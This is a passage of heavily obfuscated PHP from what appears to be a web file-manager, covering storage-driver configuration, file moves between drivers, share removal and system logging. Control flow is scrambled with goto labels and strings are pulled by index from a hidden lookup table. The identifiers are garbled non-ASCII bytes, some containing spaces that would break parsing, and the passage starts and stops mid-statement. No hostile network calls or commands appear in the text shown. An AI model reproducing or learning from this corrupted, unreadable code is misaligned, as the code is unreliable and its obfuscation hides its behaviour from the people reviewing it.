İ×Œ][$DÅ¶’¦¯Ÿ[1705]] = isset($d‹Ç¨¹¸×™[$aƒ ÔÔ‰‘Í[$DÅ¶’¦¯Ÿ[395]]]) ? $d‹Ç¨¹¸×™[$aƒ ÔÔ‰‘Í[$DÅ¶’¦¯Ÿ[395]]] : 0; } return $dùƒô¼êÙê; } public function ioSizeUseGet($b¤œŒÊùë„) { goto dŠªã…º“Ö; D Šãä‘ÄÇ: $b±‰ƒã¤™è = Cache::get($ašÇÒ‚™Ôî); if ($b±‰ƒã¤™è) { return $b±‰ƒã¤™è; } $Cº‘ƒ‚Ç¢ = array($FÃ¢Şë‹†[805] => $FÃ¢Şë‹†[395], $FÃ¢Şë‹†[2020] => $FÃ¢Şë‹†[78]); goto AŸš¬²”Ù—; dŠªã…º“Ö: $FÃ¢Şë‹† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$b¤œŒÊùë„) { return array(); } $ašÇÒ‚™Ôî = $FÃ¢Şë‹†[2019] . implode($FÃ¢Şë‹†[47], $b¤œŒÊùë„); goto D Šãä‘ÄÇ; cÀËëŸõÎº: Cache::set($ašÇÒ‚™Ôî, $b±‰ƒã¤™è, 600); return $b±‰ƒã¤™è; goto a¤‚ºğ•®­; AŸš¬²”Ù—: $DÜ´‹†Ÿ©• = array($FÃ¢Şë‹†[805] => array($FÃ¢Şë‹†[7], $b¤œŒÊùë„)); $b±‰ƒã¤™è = Model($FÃ¢Şë‹†[768])->field($Cº‘ƒ‚Ç¢)->where($DÜ´‹†Ÿ©•)->group($FÃ¢Şë‹†[805])->select(); $b±‰ƒã¤™è = array_to_keyvalue($b±‰ƒã¤™è, $FÃ¢Şë‹†[395], $FÃ¢Şë‹†[78]); goto cÀËëŸõÎº; a¤‚ºğ•®­: } public function getConfig($AÔ“Ñ¿ç‰Ô) { $a÷Œàë©Ó = parent::listData($AÔ“Ñ¿ç‰Ô); return json_decode($a÷Œàë©Ó[$_SERVER[Ôğ—¤Šµˆ˜ñ£][6]], !0); } public function update($dÅÒè§¹¨•, $bé²˜Õ°ÀŠ) { goto D´‹¨îÉŠ ; BÏ¯±­•«Ë: $bÒæ¸»¸…á = parent::update($dÅÒè§¹¨•, $bé²˜Õ°ÀŠ); if ($bÒæ¸»¸…á && $bé²˜Õ°ÀŠ[$AÓ¨ª¿Ôêè[34]]) { foreach ($d²£¼…§¢× as $Aèáè¨Ğ‘¯) { if ($Aèáè¨Ğ‘¯[$AÓ¨ª¿Ôêè[34]] && $Aèáè¨Ğ‘¯[$AÓ¨ª¿Ôêè[395]] != $dÅÒè§¹¨•) { parent::update($Aèáè¨Ğ‘¯[$AÓ¨ª¿Ôêè[395]], array($AÓ¨ª¿Ôêè[34] => 0)); } } } return $bÒæ¸»¸…á; goto bËºà”é¼ë; D´‹¨îÉŠ : $AÓ¨ª¿Ôêè =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¡À‡²ˆ = $bé²˜Õ°ÀŠ[$AÓ¨ª¿Ôêè[28]]; $d²£¼…§¢× = array_to_keyvalue(parent::listData(), $AÓ¨ª¿Ôêè[28]); goto CœÓ“£¾¸; CœÓ“£¾¸: if (isset($d²£¼…§¢×[$C¡À‡²ˆ]) && $d²£¼…§¢×[$C¡À‡²ˆ][$AÓ¨ª¿Ôêè[395]] != $dÅÒè§¹¨•) { return !1; } if (isset($bé²˜Õ°ÀŠ[$AÓ¨ª¿Ôêè[2021]]) && $bé²˜Õ°ÀŠ[$AÓ¨ª¿Ôêè[2021]] == $AÓ¨ª¿Ôêè[87]) { $this->checkConfig($bé²˜Õ°ÀŠ); } unset($bé²˜Õ°ÀŠ[$AÓ¨ª¿Ôêè[2021]]); goto BÏ¯±­•«Ë; bËºà”é¼ë: } public function add($D£°ºˆÖñ») { goto aµ¨ÓÑˆŞ; A¶ììœæó·: return $cœ¿»ŞÊÍ¦; goto A´²ÌØÓ‚; aµ¨ÓÑˆŞ: $fÜ¦‡•Ìã” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¦ÇÌÁ­ñó = array_to_keyvalue(parent::listData(), $fÜ¦‡•Ìã”[28]); if (isset($a¦ÇÌÁ­ñó[$D£°ºˆÖñ»[$fÜ¦‡•Ìã”[28]]])) { return !1; } goto fß•—’ ¥Ù; fß•—’ ¥Ù: $this->checkConfig($D£°ºˆÖñ»); $cœ¿»ŞÊÍ¦ = parent::insert($D£°ºˆÖñ»); if ($cœ¿»ŞÊÍ¦ && $D£°ºˆÖñ»[$fÜ¦‡•Ìã”[34]]) { foreach ($a¦ÇÌÁ­ñó as $CŒš»ê„¸) { if ($CŒš»ê„¸[$fÜ¦‡•Ìã”[34]]) { parent::update($CŒš»ê„¸[$fÜ¦‡•Ìã”[395]], array($fÜ¦‡•Ìã”[34] => 0)); } } } goto A¶ììœæó·; A´²ÌØÓ‚: } public function checkConfig(&$D„×ÊÓ™ œ, $B‰Ï½ìØ› = false) { goto b—ÛÏ¢¯í; dÌÓìã•Ã: foreach ($aƒ¥ø·Ì˜ as $E¼Ó™¦í¤‘ => $c‚‹µ­¸ù) { $aƒ¥ø·Ì˜[$E¼Ó™¦í¤‘] = trim($c‚‹µ­¸ù); } $aƒ¥ø·Ì˜[$DË¡‰µ“™[2022]] = rand_string(6); $Bø‡ŠæÒ‚Ò = $GLOBALS[$DË¡‰µ“™[6]][$DË¡‰µ“™[88]][$DË¡‰µ“™[814]]; goto F§›àÕ²Ã¤; E‹Å­Ã¼¬: $Bä×¶ñâÕ… = $EÀ¹±âç£Ó->getPath($dòÛñŠŒÜĞ . $DË¡‰µ“™[1159]); if (!$EÀ¹±âç£Ó->mkfile($Bä×¶ñâÕ…)) { if ($B‰Ï½ìØ›) { return LNG($DË¡‰µ“™[2026]); } show_json(LNG($DË¡‰µ“™[2026]), !1); } $aƒ¥ø·Ì˜[$DË¡‰µ“™[1097]] = $dòÛñŠŒÜĞ; goto F«‚ºÌí©¸; F§›àÕ²Ã¤: $E½¼ĞËôº = isset($Bø‡ŠæÒ‚Ò[$C‡²…¢ªè]) ? $Bø‡ŠæÒ‚Ò[$C‡²…¢ªè] : ucfirst($C‡²…¢ªè); $CÛÍÅ¸¿Ø– = $DË¡‰µ“™[72] . $E½¼ĞËôº; if (!$E½¼ĞËôº || !class_exists($CÛÍÅ¸¿Ø–)) { if ($B‰Ï½ìØ›) { return LNG($DË¡‰µ“™[2023]); } write_log(array($DË¡‰µ“™[2024], $D„×ÊÓ™ œ, get_caller_info()), $DË¡‰µ“™[2025]); show_json(LNG($DË¡‰µ“™[2023]), !1, $D„×ÊÓ™ œ); } goto e«Œ·… ›; b—ÛÏ¢¯í: $DË¡‰µ“™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C‡²…¢ªè = strtolower($D„×ÊÓ™ œ[$DË¡‰µ“™[94]]); $aƒ¥ø·Ì˜ = json_decode($D„×ÊÓ™ œ[$DË¡‰µ“™[6]], !0); goto dÌÓìã•Ã; e«Œ·… ›: $EÀ¹±âç£Ó = new $CÛÍÅ¸¿Ø–($aƒ¥ø·Ì˜); if (in_array($C‡²…¢ªè, $EÀ¹±âç£Ó->objectDriver)) { if (!$EÀ¹±âç£Ó->isBucketCors() && !$EÀ¹±âç£Ó->setBucketCors()) { $aê§Â£ãß = LNG($DË¡‰µ“™[2026]); $aê§Â£ãß .= $DË¡‰µ“™[2027] . LNG($DË¡‰µ“™[2028]); if ($B‰Ï½ìØ›) { return $aê§Â£ãß; } show_json($aê§Â£ãß, !1); } } $dòÛñŠŒÜĞ = rtrim($aƒ¥ø·Ì˜[$DË¡‰µ“™[1097]], $DË¡‰µ“™[8]) . $DË¡‰µ“™[8]; goto E‹Å­Ã¼¬; F«‚ºÌí©¸: $D„×ÊÓ™ œ[$DË¡‰µ“™[6]] = json_encode($aƒ¥ø·Ì˜); $D„×ÊÓ™ œ[$DË¡‰µ“™[94]] = $E½¼ĞËôº; return !0; goto BšÕ³™ŞÒè; BšÕ³™ŞÒè: } public function driverListSystem() { $BÅ“ÅÖØâ¤ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A‘é÷Éãˆî = parent::listData(); $cÑŒê¬È† = array(); foreach ($A‘é÷Éãˆî as $f½ò–¤­´£) { unset($f½ò–¤­´£[$BÅ“ÅÖØâ¤[194]], $f½ò–¤­´£[$BÅ“ÅÖØâ¤[84]]); $f½ò–¤­´£[$BÅ“ÅÖØâ¤[6]] = json_decode($f½ò–¤­´£[$BÅ“ÅÖØâ¤[6]], !0); $cÑŒê¬È†[] = $f½ò–¤­´£; } return $cÑŒê¬È†; } public function defaultDriver() { $cæ¹Ÿ´™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A„ºÖ´…¢ = parent::listData(); $d ªÇé°¥ò = array_filter_by_field($A„ºÖ´…¢, $cæ¹Ÿ´™[34], 1); $d ªÇé°¥ò = $d ªÇé°¥ò[0]; if ($d ªÇé°¥ò) { $d ªÇé°¥ò[$cæ¹Ÿ´™[6]] = json_decode($d ªÇé°¥ò[$cæ¹Ÿ´™[6]], !0); } return $d ªÇé°¥ò; } public function driverInfo($C¸«íìãêÜ) { $A“Ôë‚´± =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EëÖ»•„“ = array_to_keyvalue(parent::listData(), $A“Ôë‚´±[395]); if (!isset($EëÖ»•„“[$C¸«íìãêÜ])) { return !1; } $B‚«À¥ãøŠ = $EëÖ»•„“[$C¸«íìãêÜ]; $B‚«À¥ãøŠ[$A“Ôë‚´±[6]] = json_decode($B‚«À¥ãøŠ[$A“Ôë‚´±[6]], !0); return $B‚«À¥ãøŠ; } public function remove($eîë‚Âİğ) { $this->removeShareItems($eîë‚Âİğ); return parent::remove($eîë‚Âİğ); } public function removeWithFile($BÆÕÉóˆä, $d¶¤âÁÈ˜) { goto AƒÆ¬µÜ»; FŸœÂ™ôÏ: if (!$bæİÑ„Êƒ) { $BšÕì‘¿ê…->stop($A±ßÍ×…­Æ); return !1; } $BšÕì‘¿ê…->end(); if ($d¶¤âÁÈ˜ == $e×ˆ¡ß ¢[1685]) { $this->remove($BÆÕÉóˆä); } goto DÛêÌ°ÓÇ; e²ğ¯ØíÑï: $a‚ÔÍò‰“¬ = Model($e×ˆ¡ß ¢[464])->where($AìùË‚•‚Ü)->sum($e×ˆ¡ß ¢[78]); $A±ßÍ×…­Æ = $d¶¤âÁÈ˜ . $e×ˆ¡ß ¢[2029] . $BÆÕÉóˆä; $BšÕì‘¿ê… = new TaskFileTransfer($A±ßÍ×…­Æ, $e×ˆ¡ß ¢[2025], $DÖöƒ, LNG($e×ˆ¡ß ¢[2030]) . "\50{$BÆÕÉóˆä}\51"); goto D÷‘Ñƒ“¢¯; D÷‘Ñƒ“¢¯: $BšÕì‘¿ê…->task[$e×ˆ¡ß ¢[744]] = (double) $a‚ÔÍò‰“¬; $C‚®º¶¤« = KodIO::defaultDriver(); $BéÀåÛÅÂ = $C‚®º¶¤«[$e×ˆ¡ß ¢[395]]; goto d¡õğĞ­æˆ; E™ÙÒÊùä: $B‡¨š¾ŒÈ‘ = Model($e×ˆ¡ß ¢[193])->where($AìùË‚•‚Ü)->field($e×ˆ¡ß ¢[2031])->select(); foreach ($B‡¨š¾ŒÈ‘ as $a¸ŞÔŸç†) { goto eàŸ¾Ğ‡; eàŸ¾Ğ‡: $dˆ›í½åßÍ = $a¸ŞÔŸç†[$e×ˆ¡ß ¢[76]]; $C—ÚŸÆ»» = $c©ø‚Åèù . str_replace("\173\151\x6f\x3a{$BÆÕÉóˆä}\175\x2f", $e×ˆ¡ß ¢[33], $dˆ›í½åßÍ); if (!IO::exist($dˆ›í½åßÍ)) { $AÚÂ‰­¶š[] = $a¸ŞÔŸç†[$e×ˆ¡ß ¢[461]]; $BšÕì‘¿ê…->updateFileEnd($a¸ŞÔŸç†[$e×ˆ¡ß ¢[28]], $a¸ŞÔŸç†[$e×ˆ¡ß ¢[78]]); continue; } goto cÀ‹’‡Š»; A¹™êĞÏÜ : $bªó–“¨ğ¥ = array($e×ˆ¡ß ¢[805] => $BéÀåÛÅÂ, $e×ˆ¡ß ¢[76] => $C—ÚŸÆ»»); Model($e×ˆ¡ß ¢[193])->where($AìùË‚•‚Ü)->save($bªó–“¨ğ¥); goto D•›Œˆ¾æì; cÀ‹’‡Š»: if (IO::exist($C—ÚŸÆ»»)) { $BšÕì‘¿ê…->updateFileEnd($a¸ŞÔŸç†[$e×ˆ¡ß ¢[28]], $a¸ŞÔŸç†[$e×ˆ¡ß ¢[78]]); continue; } if (!IO::move($dˆ›í½åßÍ, get_path_father($C—ÚŸÆ»»))) { $bæİÑ„Êƒ = !1; break; } $AìùË‚•‚Ü = array($e×ˆ¡ß ¢[461] => $a¸ŞÔŸç†[$e×ˆ¡ß ¢[461]]); goto A¹™êĞÏÜ ; D•›Œˆ¾æì: } $this->removeByFileID($AÚÂ‰­¶š); goto FŸœÂ™ôÏ; d¡õğĞ­æˆ: $c©ø‚Åèù = "\173\151\x6f\x3a{$BéÀåÛÅÂ}\x7d\x2f"; $bæİÑ„Êƒ = !0; $AÚÂ‰­¶š = array(); goto E™ÙÒÊùä; AƒÆ¬µÜ»: $e×ˆ¡ß ¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $AìùË‚•‚Ü = array($e×ˆ¡ß ¢[805] => $BÆÕÉóˆä); $DÖöƒ = Model($e×ˆ¡ß ¢[464])->where($AìùË‚•‚Ü)->count(); goto e²ğ¯ØíÑï; DÛêÌ°ÓÇ: } public function progress($EœéÏù˜»Œ, $Fêîâ‚Ëšà) { return Task::get($Fêîâ‚Ëšà . $_SERVER[Ôğ—¤Šµˆ˜ñ£][2029] . $EœéÏù˜»Œ); } private function removeByFileID($fÀ±æšÒ“ = array()) { goto B«ªÒ’õ¡·; Dö»¤ÌÛĞˆ: $dê§¬ˆˆÂâ = Model($aãªÍ²Ò¡ç[1227])->where($C”ÀµçÈë‚)->field($aãªÍ²Ò¡ç[397])->select(); if (!$dê§¬ˆˆÂâ) { return; } $dê§¬ˆˆÂâ = array_to_keyvalue($dê§¬ˆˆÂâ, $aãªÍ²Ò¡ç[33], $aãªÍ²Ò¡ç[397]); goto b‡‘’£ª™; b‡‘’£ª™: foreach ($dê§¬ˆˆÂâ as $fˆÌ­ÒÉ»î) { Model($aãªÍ²Ò¡ç[411])->removeNow($fˆÌ­ÒÉ»î, !1); } goto Fá¤Ú£òì¢; B«ªÒ’õ¡·: $aãªÍ²Ò¡ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($fÀ±æšÒ“)) { return; } $C”ÀµçÈë‚ = array($aãªÍ²Ò¡ç[461] => array($aãªÍ²Ò¡ç[7], $fÀ±æšÒ“)); goto Dö»¤ÌÛĞˆ; Fá¤Ú£òì¢: } private function removeShareItems($A£í¨ñŠ£î) { goto BÁî‡‘é£‘; f± ÖÅİ¹: $bœ š›è = Model($eƒ‹•äÙÄ[1696])->where($AĞ§øÅ°³Š)->field($eƒ‹•äÙÄ[482])->select(); if (empty($bœ š›è)) { return; } $d–‡‹™Ş—÷ = array_to_keyvalue($bœ š›è, $eƒ‹•äÙÄ[33], $eƒ‹•äÙÄ[482]); goto c˜·¥Îˆ¶; c˜·¥Îˆ¶: Model($eƒ‹•äÙÄ[589])->remove($d–‡‹™Ş—÷); goto cŞ°¶Úİö; BÁî‡‘é£‘: $eƒ‹•äÙÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¸«ßà«â¤ = "\173\151\x6f\x3a{$A£í¨ñŠ£î}\175\x2f"; $AĞ§øÅ°³Š = array($eƒ‹•äÙÄ[397] => 0, $eƒ‹•äÙÄ[1092] => array($eƒ‹•äÙÄ[381], "{$C¸«ßà«â¤}\x25")); goto f± ÖÅİ¹; cŞ°¶Úİö: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\114\151\x67\x68\x74\101\x70\x70"; public $modelType = "\123\x79\163\164\145\x6d\x4f\x70\x74\151\x6f\156"; public $field = array("\x6e\x61\155\145", "\147\x72\x6f\x75\x70", "\x64\145\x73\143", "\143\x6f\156\x74\145\x6e\164"); public function listData($B‡œò‘Ïß© = false, $cÚª¼‰°±” = "\155\x6f\x64\x69\x66\x79\124\151\155\x65", $BØ„¦°°ˆ‹ = true) { return parent::listData($B‡œò‘Ïß©, $cÚª¼‰°±”, $BØ„¦°°ˆ‹); } public function remove($DĞàù±‰½Û) { $fˆêæëÀÆ® = $this->findByName($DĞàù±‰½Û); if (!$fˆêæëÀÆ®) { return !1; } return parent::remove($fˆêæëÀÆ®[$_SERVER[Ôğ—¤Šµˆ˜ñ£][395]]); } public function add($Dğƒ’­ŒÈí) { if ($this->findByName($Dğƒ’­ŒÈí[$_SERVER[Ôğ—¤Šµˆ˜ñ£][28]])) { return !1; } return parent::insert($Dğƒ’­ŒÈí); } public function update($eãÁ»¡¨íŞ, $a‡‡¢¾‚‰Ó) { $CÄÙé½›ŠŞ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cŠŸ›íÉ = $this->findByName($eãÁ»¡¨íŞ); $aâš¡•” = $this->findByName($a‡‡¢¾‚‰Ó[$CÄÙé½›ŠŞ[28]]); if (!$cŠŸ›íÉ || $aâš¡•” && $aâš¡•”[$CÄÙé½›ŠŞ[395]] != $cŠŸ›íÉ[$CÄÙé½›ŠŞ[395]]) { return !1; } return parent::update($cŠŸ›íÉ[$CÄÙé½›ŠŞ[395]], $a‡‡¢¾‚‰Ó); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\143\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $B·¤­Æß…ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($B·¤­Æß…ç[2032] => LNG($B·¤­Æß…ç[2033]), $B·¤­Æß…ç[2034] => LNG($B·¤­Æß…ç[2035]), $B·¤­Æß…ç[1659] => LNG($B·¤­Æß…ç[2036]), $B·¤­Æß…ç[2037] => LNG($B·¤­Æß…ç[2038]), $B·¤­Æß…ç[2039] => LNG($B·¤­Æß…ç[2040]), $B·¤­Æß…ç[2041] => LNG($B·¤­Æß…ç[2042]), $B·¤­Æß…ç[2043] => LNG($B·¤­Æß…ç[2044]), $B·¤­Æß…ç[1689] => LNG($B·¤­Æß…ç[2044]), $B·¤­Æß…ç[1690] => LNG($B·¤­Æß…ç[2045]), $B·¤­Æß…ç[2046] => LNG($B·¤­Æß…ç[2047]), $B·¤­Æß…ç[2048] => LNG($B·¤­Æß…ç[2049]), $B·¤­Æß…ç[2050] => LNG($B·¤­Æß…ç[2051]), $B·¤­Æß…ç[2052] => LNG($B·¤­Æß…ç[2053]), $B·¤­Æß…ç[1687] => LNG($B·¤­Æß…ç[2054]), $B·¤­Æß…ç[2055] => LNG($B·¤­Æß…ç[2056]), $B·¤­Æß…ç[1694] => LNG($B·¤­Æß…ç[2057]), $B·¤­Æß…ç[2058] => LNG($B·¤­Æß…ç[2059]), $B·¤­Æß…ç[2060] => LNG($B·¤­Æß…ç[2061]), $B·¤­Æß…ç[2062] => LNG($B·¤­Æß…ç[2063]), $B·¤­Æß…ç[2064] => LNG($B·¤­Æß…ç[2065]), $B·¤­Æß…ç[1697] => LNG($B·¤­Æß…ç[2066]), $B·¤­Æß…ç[1698] => LNG($B·¤­Æß…ç[2067]), $B·¤­Æß…ç[2068] => LNG($B·¤­Æß…ç[2069]), $B·¤­Æß…ç[2070] => LNG($B·¤­Æß…ç[2071]), $B·¤­Æß…ç[2072] => LNG($B·¤­Æß…ç[2073]), $B·¤­Æß…ç[1692] => LNG($B·¤­Æß…ç[2074]), $B·¤­Æß…ç[2075] => LNG($B·¤­Æß…ç[2076]), $B·¤­Æß…ç[1691] => LNG($B·¤­Æß…ç[2077]), $B·¤­Æß…ç[2078] => LNG($B·¤­Æß…ç[2079]), $B·¤­Æß…ç[2080] => LNG($B·¤­Æß…ç[2081]), $B·¤­Æß…ç[2082] => LNG($B·¤­Æß…ç[2083]), $B·¤­Æß…ç[2084] => LNG($B·¤­Æß…ç[2084]), $B·¤­Æß…ç[2085] => LNG($B·¤­Æß…ç[1663]), $B·¤­Æß…ç[2086] => LNG($B·¤­Æß…ç[2087]), $B·¤­Æß…ç[2088] => LNG($B·¤­Æß…ç[2089]), $B·¤­Æß…ç[2090] => LNG($B·¤­Æß…ç[2091]), $B·¤­Æß…ç[2092] => LNG($B·¤­Æß…ç[2093]), $B·¤­Æß…ç[2094] => LNG($B·¤­Æß…ç[2095]), $B·¤­Æß…ç[2096] => LNG($B·¤­Æß…ç[2096]), $B·¤­Æß…ç[2097] => LNG($B·¤­Æß…ç[2098]), $B·¤­Æß…ç[2099] => LNG($B·¤­Æß…ç[2100]), $B·¤­Æß…ç[2101] => LNG($B·¤­Æß…ç[2102]), $B·¤­Æß…ç[2103] => LNG($B·¤­Æß…ç[2104]), $B·¤­Æß…ç[2105] => LNG($B·¤­Æß…ç[2106]), $B·¤­Æß…ç[2107] => LNG($B·¤­Æß…ç[2108])); } private function typeFile() { $dğêñÒ”•£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cØÓ»áÙ® = array($dğêñÒ”•£[1694] => array($dğêñÒ”•£[1695]), $dğêñÒ”•£[2050] => array($dğêñÒ”•£[2109]), $dğêñÒ”•£[2052] => array($dğêñÒ”•£[2110]), $dğêñÒ”•£[1687] => array($dğêñÒ”•£[1688]), $dğêñÒ”•£[2060] => array(), $dğêñÒ”•£[2062] => array(), $dğêñÒ”•£[2064] => array(), $dğêñÒ”•£[1697] => array($dğêñÒ”•£[1699]), $dğêñÒ”•£[1698] => array($dğêñÒ”•£[1699]), $dğêñÒ”•£[2068] => array($dğêñÒ”•£[2111]), $dğêñÒ”•£[2070] => array($dğêñÒ”•£[2111]), $dğêñÒ”•£[2072] => array($dğêñÒ”•£[2112]), $dğêñÒ”•£[2058] => array($dğêñÒ”•£[2113]), $dğêñÒ”•£[1692] => array($dğêñÒ”•£[2114]), $dğêñÒ”•£[2075] => array($dğêñÒ”•£[2115]), $dğêñÒ”•£[1691] => array($dğêñÒ”•£[1693])); return $cØÓ»áÙ®; } private function typeAll() { goto e‡­éÊ¦ƒ‰; e‡­éÊ¦ƒ‰: $bîáù»¶—Ş =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÅÜ‘Ö§ë² = $this->typeList; $Bòº™©â† = array_filter($this->typeFile()); goto BôŒ’‹¶‚å; aó—Ì‹ï£: return $CÅÜ‘Ö§ë²; goto F‰¤õ³¦ê›; BôŒ’‹¶‚å: foreach ($Bòº™©â† as $Cëª­Ó †« => $b¬š…©˜Ê) { $CÅÜ‘Ö§ë²[$b¬š…©˜Ê[0]] = $CÅÜ‘Ö§ë²[$Cëª­Ó †«]; } $CÅÜ‘Ö§ë²[$bîáù»¶—Ş[1699]] = LNG($bîáù»¶—Ş[2116]); $CÅÜ‘Ö§ë²[$bîáù»¶—Ş[2111]] = LNG($bîáù»¶—Ş[2117]); goto aó—Ì‹ï£; F‰¤õ³¦ê›: } public function addLog($fòŠ¥´¡¿, $EÈ·ª‰ĞÂ± = array()) { goto d‹ÔùöÌ†; FŸ¥…Û¢¾: $EÈ·ª‰ĞÂ± = array($EŒë…„˜Öì[1540] => Session::sign(), $EŒë…„˜Öì[1541] => $bïØ“ÊĞ, $EŒë…„˜Öì[29] => $fòŠ¥´¡¿, $EŒë…„˜Öì[1543] => json_encode($EÈ·ª‰ĞÂ±)); parent::add($EÈ·ª‰ĞÂ±); goto f«¢ÔÌÛğ‚; d‹ÔùöÌ†: $EŒë…„˜Öì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->typeList[$fòŠ¥´¡¿])) { return; } $bïØ“ÊĞ = defined($EŒë…„˜Öì[468]) && USER_ID ? USER_ID : (isset($EÈ·ª‰ĞÂ±[$EŒë…„˜Öì[1550]]) ? $EÈ·ª‰ĞÂ±[$EŒë…„˜Öì[1550]] : 0); goto F±À³…Ô†; F±À³…Ô†: if (!$bïØ“ÊĞ) { $bïØ“ÊĞ = (int) Session::get($EŒë…„˜Öì[1850]); } $dƒ ºÆë°ä = get_client_ip(); if (!$EÈ·ª‰ĞÂ± || strlen(json_encode($EÈ·ª‰ĞÂ±)) >= 1024) { $EÈ·ª‰ĞÂ± = array($EŒë…„˜Öì[2118] => $dƒ ºÆë°ä); } else { if (is_array($EÈ·ª‰ĞÂ±)) { $EÈ·ª‰ĞÂ±[$EŒë…„˜Öì[2118]] = $dƒ ºÆë°ä; } else { $EÈ·ª‰ĞÂ± = array($EŒë…„˜Öì[1109] => $EÈ·ª‰ĞÂ±, $EŒë…„˜Öì[2118] => $dƒ ºÆë°ä); } } goto FŸ¥…Û¢¾; f«¢ÔÌÛğ‚: } public function remove($d‹£ˆí†â¾) { $this->where(array($_SERVER[Ôğ—¤Šµˆ˜ñ£][414] => $d‹£ˆí†â¾))->delete(); } private function _makeOrder($fï­œššŸ° = '') { goto DâßÈ‚ìè‰; c‘ºñâßÂ: $e‡Î›¤¢° = Input::get($Dç˜•‚ÊîŒ[450], $Dç˜•‚ÊîŒ[7], $Dç˜•‚ÊîŒ[1882], array($Dç˜•‚ÊîŒ[1806], $Dç˜•‚ÊîŒ[444])); $e‡Î›¤¢° = $dí÷“®Á¿¡[$e‡Î›¤¢°]; $fï­œššŸ° = $fï­œššŸ° . "{$eÉ¯…†¬ÄŒ}\40{$e‡Î›¤¢°}"; goto eêÛçÏ”Í; DâßÈ‚ìè‰: $Dç˜•‚ÊîŒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÉ¯…†¬ÄŒ = $Dç˜•‚ÊîŒ[194]; $dí÷“®Á¿¡ = array($Dç˜•‚ÊîŒ[442] => $Dç˜•‚ÊîŒ[443], $Dç˜•‚ÊîŒ[444] => $Dç˜•‚ÊîŒ[445]); goto c‘ºñâßÂ; eêÛçÏ”Í: return $this->order($fï­œššŸ°); goto CÙÎ—÷ğÁ×; CÙÎ—÷ğÁ×: } public function get($b·ô¸‚£•˜ = '') { goto FÚâº˜¼Å¤; b“…ôœº¾ª: $b¥µÕïîÖÙ[$A©¥Š÷Šº[367]] = $this->logList($b¥µÕïîÖÙ[$A©¥Š÷Šº[367]]); return $b¥µÕïîÖÙ; goto EñºÄ¯ÆÑß; FÚâº˜¼Å¤: $A©¥Š÷Šº =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$b·ô¸‚£•˜) { show_json(array()); } $C•É‰Œ¤Œ‹ = array(); goto DÓ‘«µô£‹; DÓ‘«µô£‹: if ($b·ô¸‚£•˜[$A©¥Š÷Šº[1550]]) { $C•É‰Œ¤Œ‹[$A©¥Š÷Šº[1550]] = $b·ô¸‚£•˜[$A©¥Š÷Šº[1550]]; } if (isset($b·ô¸‚£•˜[$A©¥Š÷Šº[742]])) { $dÚöÔ§õ¶Í = $b·ô¸‚£•˜[$A©¥Š÷Šº[742]]; $Eğœˆ®­‹Ù = isset($b·ô¸‚£•˜[$A©¥Š÷Šº[490]]) ? $b·ô¸‚£•˜[$A©¥Š÷Šº[490]] : time(); $C•É‰Œ¤Œ‹[$A©¥Š÷Šº[194]] = array($A©¥Š÷Šº[331], array($dÚöÔ§õ¶Í, $Eğœˆ®­‹Ù)); } if ($b·ô¸‚£•˜[$A©¥Š÷Šº[29]]) { $E´™ó¾çéŠ = explode($A©¥Š÷Šº[47], $b·ô¸‚£•˜[$A©¥Š÷Šº[29]]); $Aöƒ¢³¯äŸ = $this->typeFile(); $CôïÚäù¼Ú = array(); foreach ($E´™ó¾çéŠ as $c÷‰§ŠÕÛß) { $CôïÚäù¼Ú[] = $c÷‰§ŠÕÛß; if (isset($Aöƒ¢³¯äŸ[$c÷‰§ŠÕÛß])) { $CôïÚäù¼Ú = array_merge($CôïÚäù¼Ú, $Aöƒ¢³¯äŸ[$c÷‰§ŠÕÛß]); } } $CôïÚäù¼Ú = array_unique($CôïÚäù¼Ú); if ($CôïÚäù¼Ú) { $C•É‰Œ¤Œ‹[$A©¥Š÷Šº[29]] = array($A©¥Š÷Šº[7], $CôïÚäù¼Ú); } } else { $C•É‰Œ¤Œ‹[$A©¥Š÷Šº[29]] = array($A©¥Š÷Šº[2119], $A©¥Š÷Šº[2120]); } goto e¬”í öè; e¬”í öè: if (!empty($b·ô¸‚£•˜[$A©¥Š÷Šº[2118]])) { $C•É‰Œ¤Œ‹[$A©¥Š÷Šº[445]] = array($A©¥Š÷Šº[381], "\x25{$b·ô¸‚£•˜[$A©¥Š÷Šº[2118]]}\45"); } $b¥µÕïîÖÙ = $this->_makeOrder()->where($C•É‰Œ¤Œ‹)->selectPage(); if (empty($b¥µÕïîÖÙ[$A©¥Š÷Šº[367]])) { show_json(array(), !0, $b¥µÕïîÖÙ[$A©¥Š÷Šº[364]]); } goto b“…ôœº¾ª; EñºÄ¯ÆÑß: } private function ipAddress(&$C´áİë¾„) { $F©¥¨ÁâÕê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($C´áİë¾„[$F©¥¨ÁâÕê[2118]])) { $aÙøÆĞ’Ğ = IpLocation::get($C´áİë¾„[$F©¥¨ÁâÕê[2118]]); } else { $aÙøÆĞ’Ğ = LNG($F©¥¨ÁâÕê[2121]); } $C´áİë¾„[$F©¥¨ÁâÕê[2122]] = $aÙøÆĞ’Ğ; } private function descZipDownload($A‰ôĞ‚À‚, 